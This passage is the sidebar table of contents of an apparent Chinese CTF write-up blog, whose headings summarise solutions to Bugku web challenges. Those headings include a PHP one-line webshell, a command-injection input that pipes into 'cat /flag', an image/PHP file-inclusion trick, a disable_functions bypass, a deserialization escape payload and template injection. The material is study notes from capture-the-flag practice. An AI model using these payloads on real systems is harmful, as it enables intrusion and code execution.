href="#2-114-67-175-224-18959-ac-flag-amp-fn-https-n9-zqc-github-io-test-txt-%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%98%AFfile-get-contents%E8%AF%BB%E5%8F%96%E7%9A%84%E6%98%AF%E6%96%87%E4%BB%B6%EF%BC%8C%E6%89%80%E4%BB%A5%E5%9C%A8%E8%87%AA%E5%B7%B1%E7%BD%91%E7%AB%99%E4%B8%8A%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AA%E5%86%85%E5%AE%B9%E5%92%8Cflag%E4%B8%80%E6%A0%B7%E7%9A%84%E6%96%87%E4%BB%B6%E5%8D%B3%E5%8F%AF%EF%BC%8C%E8%AF%A5%E7%BD%91%E7%AB%99%E4%B8%80%E5%AE%9A%E8%83%BD%E8%AE%A9%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE%E6%89%8D%E5%8F%AF%E4%BB%A5%EF%BC%8C"><span class="nav-number">1.18.2.</span> <span class="nav-text">2.114.67.175.224:18959&#x2F;?ac&#x3D;flag&amp;fn&#x3D;https:&#x2F;&#x2F;n9-zqc.github.io&#x2F;test.txt  第二种是file_get_contents读取的是文件，所以在自己网站上上传一个内容和flag一样的文件即可，该网站一定能让外网访问才可以，</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%93%9F"><span class="nav-number">1.19.</span> <span class="nav-text">各种绕过哟</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#sha1%E7%94%A8%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E3%80%82"><span class="nav-number">1.19.1.</span> <span class="nav-text">sha1用数组绕过。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.20.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F"><span class="nav-number">1.21.</span> <span class="nav-text">字符？正则？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9C%80%E8%A6%81%E7%AE%A1%E7%90%86%E5%91%98"><span class="nav-number">1.22.</span> <span class="nav-text">需要管理员</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BE%A1%E5%89%91%E7%88%86%E7%A0%B4%EF%BC%8C%E6%9F%A5%E5%87%BArobots-txt%E9%87%8C%E9%9D%A2%E6%8F%90%E7%A4%BAresusl-php-%E6%8F%90%E7%A4%BA"><span class="nav-number">1.22.1.</span> <span class="nav-text">御剑爆破，查出robots.txt里面提示resusl.php,提示</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEresusl-php-x-admin%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0flag"><span class="nav-number">1.22.2.</span> <span class="nav-text">访问resusl.php&#x2F;?x&#x3D;admin即可得到flag</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2"><span class="nav-number">1.23.</span> <span class="nav-text">文件包含2</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E4%BA%86asp%E6%B2%A1%E6%88%90%E5%8A%9F%EF%BC%8C%E7%9C%8B%E5%88%AB%E4%BA%BA%E5%86%99%E7%9A%84wp%EF%BC%8C%E7%9F%A5%E9%81%93%E4%BA%86%E6%96%B0%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-number">1.23.1.</span> <span class="nav-text">尝试了asp没成功，看别人写的wp，知道了新的一句话木马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%88%E6%98%AF%E6%89%BE%E5%88%B0upload-php%EF%BC%8C%E5%9C%A8%E4%B8%8A%E4%BC%A0jpg%E6%96%87%E4%BB%B6%EF%BC%8C%E5%86%8D%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%82%E4%BD%BF%E7%94%A8%E5%9B%BE%E7%89%87%E5%8A%A0php%E6%96%87%E4%BB%B6%E5%8D%B3copy-C-Users-Desktop-1-jpg-b-C-Users-Desktop-web-php-a-hack-jpg-%E7%9A%84%E6%96%B9%E5%BC%8F%E4%B8%8A%E4%BC%A0%E5%90%88%E5%B9%B6%E7%9A%84%E5%9B%BE%E7%89%87%EF%BC%8C%E5%86%8D%E5%8C%85%E5%90%AB%E3%80%82%E6%B3%A8%E6%84%8F%E7%9A%84%E6%98%AF%E8%A2%AB%E6%89%A7%E8%A1%8C%E7%9A%84%E4%BB%A3%E7%A0%81%E6%98%AF%E4%B8%8D%E4%BC%9A%E5%9C%A8%E5%8C%85%E5%90%AB%E7%9A%84%E9%A1%B5%E9%9D%A2%E6%98%BE%E7%A4%BA%E5%87%BA%E6%9D%A5%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%BC%9A%E6%89%A7%E8%A1%8C%E3%80%82"><span class="nav-number">1.23.2.</span> <span class="nav-text">先是找到upload.php，在上传jpg文件，再文件包含。使用图片加php文件即copy C:\Users\Desktop\1.jpg&#x2F;b+C:\Users\Desktop\web.php&#x2F;a hack.jpg 的方式上传合并的图片，再包含。注意的是被执行的代码是不会在包含的页面显示出来，这样就可以判断是否会执行。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%81%AA%E6%98%8E%E7%9A%84php"><span class="nav-number">1.24.</span> <span class="nav-text">聪明的php</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%9A%8F%E4%BE%BF%E8%BE%93%E5%85%A5%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%98%AFSmarty%E6%A8%A1%E6%9D%BF%EF%BC%8C%E8%BE%93%E5%85%A5-7-7-%E5%BE%97%E5%88%B049%EF%BC%8C%E9%AA%8C%E8%AF%81%E6%88%90%E5%8A%9F%E3%80%82"><span class="nav-number">1.24.1.</span> <span class="nav-text">随便输入一个参数，可以得到源代码，发现是Smarty模板，输入{7*7},得到49，验证成功。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%82%B9login%E5%92%8B%E6%B2%A1%E5%8F%8D%E5%BA%94"><span class="nav-number">1.25.</span> <span class="nav-text">点login咋没反应</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%A2%9E%E5%8A%A0%EF%BC%9Acookie-BUGKU-s-13-%E2%80%9Dctf-bugku-com%E2%80%9D-%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0flag"><span class="nav-number">1.25.1.</span> <span class="nav-text">请求头增加：cookie: BUGKU&#x3D;s:13:”ctf.bugku.com”;即可得到flag</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">1.26.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E2%80%9C-056-160-150-x70-i-%E2%80%9D-%E5%90%8E%E9%9D%A2%E7%9A%84%E4%B8%BA-php%EF%BC%8C%E8%87%AA%E5%8A%A8%E8%BD%AC%E6%8D%A2%E3%80%82%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E6%98%AF-%E6%9C%89%E4%B8%A4%E6%AC%A1%E8%BD%AC%E4%B9%89%EF%BC%8C%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%BA-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%B8%BA-%E3%80%82%E6%89%80%E4%BB%A5%E5%8C%B9%E9%85%8D%E7%9A%84%E6%98%AF-php"><span class="nav-number">1.26.1.</span> <span class="nav-text">“&#x2F;\|\056\160\150\x70&#x2F;i ”   后面的为.php，自动转换。需要注意的是\ \ | ,有两次转义，第一次为\ |,第二次为 |。所以匹配的是|.php.</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%E4%B8%BA-zero-ZmxhZw-amp-first-girl-php-zero%E4%BB%A3%E8%A1%A8%E7%9D%80%E6%98%AFflag%E3%80%82"><span class="nav-number">1.26.1.1.</span> <span class="nav-text">综上为?zero&#x3D;ZmxhZw&#x3D;&#x3D;&amp;first&#x3D;girl|.php    zero代表着是flag。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%EF%BC%9A-%E2%80%98-%E2%80%99%E5%8C%B9%E9%85%8D%E2%80%99-%E2%80%99-%E2%80%98-%E2%80%99%E5%8C%B9%E9%85%8D%E2%80%99-%E2%80%99-%E8%80%8C%E5%A6%82%E6%9E%9C%E6%98%AF-%E5%8C%B9%E9%85%8D%E2%80%99-%E2%80%99-%E2%80%98-%E2%80%99%E7%BB%8F%E8%BF%87%E6%B5%8B%E8%AF%95%E6%8B%A6%E6%88%AA%E4%BA%86%E2%80%9C-%E2%80%9D-%E8%BF%99%E4%B8%A4%E4%B8%AA%E9%83%BD%E8%A6%81%E6%8B%A6%E6%88%AA%EF%BC%8C%E4%B8%8D%E5%8F%AA%E6%98%AF%E2%80%9C-%E2%80%9D"><span class="nav-number">1.26.2.</span> <span class="nav-text">正则： ‘\ |’匹配’|’ ‘\ \ |’匹配’|’ 而如果是\ \ \ |匹配’\ |’ ‘\ \ \ \ |’经过测试拦截了“,\ \” 这两个都要拦截，不只是“\ \”</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD"><span class="nav-number">1.27.</span> <span class="nav-text">闪电十六鞭</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%92%8C%E6%98%AF%E7%9F%AD%E6%A0%87%E7%AD%BE%E8%80%8C%E6%98%AF%E9%95%BF%E6%A0%87%E7%AD%BE%EF%BC%8C"><span class="nav-number">1.27.1.</span> <span class="nav-text">和是短标签而是长标签，</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B6%E4%B8%AD"><span class="nav-number">1.27.2.</span> <span class="nav-text">其中 代替的是</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA"><span class="nav-number">1.28.</span> <span class="nav-text">xxx二手交易市场</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA%E8%B4%A6%E5%8F%B7%EF%BC%8C%E9%9A%8F%E4%BE%BF%E7%BF%BB%E4%B8%80%E4%B8%8B%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89%E4%B8%80%E4%B8%AA%E5%A4%B4%E5%83%8F%E4%B8%8A%E4%BC%A0%EF%BC%8Cbs%E6%8A%93%E5%8C%85%E3%80%82"><span class="nav-number">1.28.1.</span> <span class="nav-text">1.随便注册一个账号，随便翻一下页面，发现有一个头像上传，bs抓包。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E6%85%B0%E5%A5%96"><span class="nav-number">1.29.</span> <span class="nav-text">安慰奖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#decrypt"><span class="nav-number">1.30.</span> <span class="nav-text">decrypt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#login2"><span class="nav-number">1.31.</span> <span class="nav-text">login2</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="nav-number">1.31.0.1.</span> <span class="nav-text">第一种方法</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95-%E5%88%A9%E7%94%A8sleep%E5%87%BD%E6%95%B0"><span class="nav-number">1.31.0.2.</span> <span class="nav-text">第二种方法 利用sleep函数</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BD%91%E4%B8%8A%E7%9C%8B%E5%88%B0%E7%9A%84%E6%9C%80%E7%BB%88%E6%96%B9%E6%B3%95%EF%BC%88%E7%BD%91%E9%A1%B5%E6%98%AF%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84%EF%BC%89"><span class="nav-number">1.31.1.</span> <span class="nav-text">网上看到的最终方法（网页是没有回显的）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%87%87%E7%94%A8%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E4%BA%8C%E6%AC%A1%E8%BF%94%E5%9B%9E%E7%9A%84%E6%96%B9%E6%B3%95%E6%9F%A5%E7%9C%8B%E7%BB%93%E6%9E%9C"><span class="nav-number">1.31.2.</span> <span class="nav-text">采用写入文件二次返回的方法查看结果</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#123-ls-gt-test"><span class="nav-number">1.31.3.</span> <span class="nav-text">123|ls ..&#x2F;..&#x2F;..&#x2F;&gt;test</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEhttp-114-67-246-176-11727-test"><span class="nav-number">1.31.4.</span> <span class="nav-text">访问http:&#x2F;&#x2F;114.67.246.176:11727&#x2F;test</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#123-cat-flag-gt-test"><span class="nav-number">1.31.5.</span> <span class="nav-text">123|cat &#x2F;flag&gt;test</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%8D%E8%AE%BF%E9%97%AEhttp-114-67-246-176-11727-test"><span class="nav-number">1.31.6.</span> <span class="nav-text">再访问http:&#x2F;&#x2F;114.67.246.176:11727&#x2F;test</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getshell"><span class="nav-number">1.32.</span> <span class="nav-text">getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E6%89%93%E5%BC%80%E5%8F%91%E7%8E%B0php%E4%BB%A3%E7%A0%81%E4%B8%BA%E4%B9%B1%E7%A0%81%EF%BC%8C%E5%BA%94%E8%AF%A5%E6%98%AF%E4%BD%BF%E7%94%A8%E4%BA%86php%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%E3%80%82"><span class="nav-number">1.32.1.</span> <span class="nav-text">1.打开发现php代码为乱码，应该是使用了php混淆加密，使用在线解密。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%E4%B8%BA-eval-POST-ymlisisisiook-%E4%B8%BA%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%8C%E7%94%A8%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%8F%AA%E8%83%BD%E6%9F%A5%E7%9C%8Bhtml%E7%9B%AE%E5%BD%95%E9%87%8C%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E5%85%B6%E5%AE%83%E4%B8%8D%E8%83%BD%E6%9F%A5%E7%9C%8B%E3%80%82"><span class="nav-number">1.32.2.</span> <span class="nav-text">发现为@eval($_POST[ymlisisisiook]); 为一句话木马，用蚁剑连接，发现只能查看html目录里的内容，其它不能查看。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E6%97%B6%E5%80%99%E6%98%BE%E7%A4%BAred-127%EF%BC%8C%E7%8C%9C%E6%B5%8B%E5%BA%94%E8%AF%A5%E6%98%AF%E6%9C%89disable-functions%E5%AF%B9%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E9%99%90%E5%88%B6%EF%BC%8C%E6%9F%A5%E7%9C%8Bphpinfo%E7%A1%AE%E8%AE%A4%E4%B8%80%E4%B8%8B%EF%BC%8C%E4%BB%A5%E4%B8%8A%E4%BB%A3%E7%A0%81%E5%B0%B1%E6%98%AF%E7%A1%AE%E8%AE%A4%E7%9A%84disable-functions"><span class="nav-number">1.32.3.</span> <span class="nav-text">2.执行命令的时候显示red&#x3D;127，猜测应该是有disable_functions对执行命令的函数进行限制，查看phpinfo确认一下，以上代码就是确认的disable_functions</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E6%89%93%E5%BC%80%E8%9A%81%E5%89%91%EF%BC%8C%E4%B8%8B%E8%BD%BD%E7%BB%95%E8%BF%87disable-functions%EF%BC%8C%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6%EF%BC%8C%E7%94%9F%E6%88%90%E4%B8%A4%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C%E5%86%8D%E7%94%A8-%E5%BC%80%E5%A4%B4%E7%9A%84%E6%96%87%E4%BB%B6%E9%87%8D%E6%96%B0%E5%8A%A0%E8%BD%BD%EF%BC%8C%E5%AF%86%E7%A0%81%E5%92%8C%E4%B9%8B%E5%89%8D%E4%B8%80%E6%A0%B7%EF%BC%8C%E6%88%90%E5%8A%9F%E5%90%8E%EF%BC%8C%E5%9C%A8%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%8D%B3%E5%8F%AF%E8%8E%B7%E5%BE%97flag%E3%80%82"><span class="nav-number">1.32.4.</span> <span class="nav-text">3.打开蚁剑，下载绕过disable_functions，加载插件，生成两个文件，再用.开头的文件重新加载，密码和之前一样，成功后，在根目录下即可获得flag。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#newphp-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8-%E5%BD%93%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%90%8E%E5%AF%B9%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E8%A1%8C%E4%BF%AE%E6%94%B9%E6%97%B6%E8%A7%A6%E5%8F%91-ssrf"><span class="nav-number">1.33.</span> <span class="nav-text">newphp php 反序列化字符串逃逸(当序列化之后对序列化的字符串进行修改时触发) ssrf</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0%EF%BC%9A%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9C%A8%E7%BB%8F%E8%BF%87%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E4%B8%8D%E6%AD%A3%E7%A1%AE%E7%9A%84%E5%A4%84%E7%90%86%E8%80%8C%E5%AF%BC%E8%87%B4%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5-%E5%BD%93%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%95%BF%E5%BA%A6%E4%B8%8D%E5%A4%9F%E6%97%B6%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BC%9A%E5%87%BA%E9%94%99%EF%BC%8C%E6%89%80%E4%BB%A5%E9%80%9A%E8%BF%87%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E4%BD%BF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%88%90%E5%8A%9F"><span class="nav-number">1.33.1.</span> <span class="nav-text">漏洞原因：序列化的字符串在经过过滤函数不正确的处理而导致对象注入(当字符串长度不够时，反序列化会出错，所以通过字符串逃逸使反序列化成功)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B6%E7%AC%AC%E4%B8%80%E6%AD%A5%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%93%E6%9E%9C%E4%B8%BAO-4-%E2%80%9DUser%E2%80%9D-2-s-8-%E2%80%9Dusername%E2%80%9D-s-48-%E2%80%9D-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0%E2%80%9D-s-8-%E2%80%9Dpassword%E2%80%9D-s-44-%E2%80%9D1%E2%80%9D-O-4-%E2%80%9Devil%E2%80%9D-2-s-4-%E2%80%9Dhint%E2%80%9D-s-8-%E2%80%9Dhint-php%E2%80%9D"><span class="nav-number">1.33.2.</span> <span class="nav-text">其第一步序列化结果为O:4:”User”:2:{s:8:”username”;s:48:”\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0”;s:8:”password”;s:44:”1”;O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}}</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%8F%E8%BF%87read%E5%87%BD%E6%95%B0%E5%8F%98%E4%B8%BA"><span class="nav-number">1.33.3.</span> <span class="nav-text">经过read函数变为</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#s-8-%E2%80%9Dusername%E2%80%9D-s-48-%E2%80%9D111111111111111111111111%E2%80%9D-s-8-%E2%80%9Dpassword%E2%80%9D-s-44-%E2%80%9D1%E2%80%9D-O-4-%E2%80%9Devil%E2%80%9D-2-s-4-%E2%80%9Dhint%E2%80%9D-s-8-%E2%80%9Dhint-php%E2%80%9D"><span class="nav-number">1.33.4.</span> <span class="nav-text">{s:8:”username”;s:48:”111111111111111111111111”;s:8:”password”;s:44:”1”; O:4:”evil”:2:{s:4:”hint”;s:8:”hint.php”;}}</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#s-8-%E2%80%9Dpassword%E2%80%9D-s-44-%E2%80%9D1%E2%80%9D-%E9%95%BF%E5%BA%A6%E6%98%AF24%EF%BC%8C%E5%8E%BB%E6%8E%8924%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%8C%E5%90%8E%E9%9D%A2%E5%B0%B1%E9%80%83%E9%80%B8%E4%BA%86%EF%BC%8C%E6%AD%A3%E5%B8%B8%E7%9A%84%E8%A2%AB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%86"><span class="nav-number">1.33.5.</span> <span class="nav-text">s:8:”password”;s:44:”1”;长度是24，去掉24个字符，后面就逃逸了，正常的被反序列化了</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%A8%E6%84%8Fread%E4%B8%AD%E5%B0%86%E2%80%99-0-0-0%E2%80%99%E5%85%AD%E4%B8%AA%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2%E4%B8%BA%E4%BA%86%E4%B8%89%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%8C%E8%BF%99%E5%B0%B1%E7%BB%99%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E6%8F%90%E4%BE%9B%E4%BA%86%E6%9C%BA%E4%BC%9A%E3%80%82"><span class="nav-number">1.33.6.</span> <span class="nav-text">注意read中将’\0\0\0’六个字符替换为了三个字符，这就给反序列化字符串逃逸提供了机会。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%84%9F%E8%A7%89%E6%9C%89ssrf"><span class="nav-number">1.33.7.</span> <span class="nav-text">感觉有ssrf</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http%E6%98%AF%E4%BB%A5%E7%A9%BA%E6%A0%BC%E4%BD%9C%E4%B8%BA%E6%88%AA%E6%96%AD%E7%AC%A6%E7%9A%84%EF%BC%8C%E6%9C%89%E4%BA%86%E7%A9%BA%E6%A0%BC%EF%BC%8C%E8%87%AA%E5%8A%A8%E5%88%A4%E6%96%AD%E8%BE%93%E5%85%A5%E7%BB%93%E6%9D%9F"><span class="nav-number">1.33.8.</span> <span class="nav-text">http是以空格作为截断符的，有了空格，自动判断输入结束</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86"><span class="nav-number">1.34.</span> <span class="nav-text">都过滤了</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sodirty"><span class="nav-number">1.35.</span> <span class="nav-text">sodirty</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#js%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93"><span class="nav-number">1.35.0.1.</span> <span class="nav-text">js原型污染</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%BE%A1%E5%89%91%E6%89%AB%E6%8F%8F%EF%BC%8C%E6%89%AB%E5%88%B0www-zip-%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%E3%80%82"><span class="nav-number">1.35.1.</span> <span class="nav-text">1.御剑扫描，扫到www.zip,下载下来。</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="N9-zqc"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">N9-zqc</p>
  <div class="site-description" itemprop="description">主要有关ctf的学习笔记,主攻逆向和Web</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">14</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">N9-zqc</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
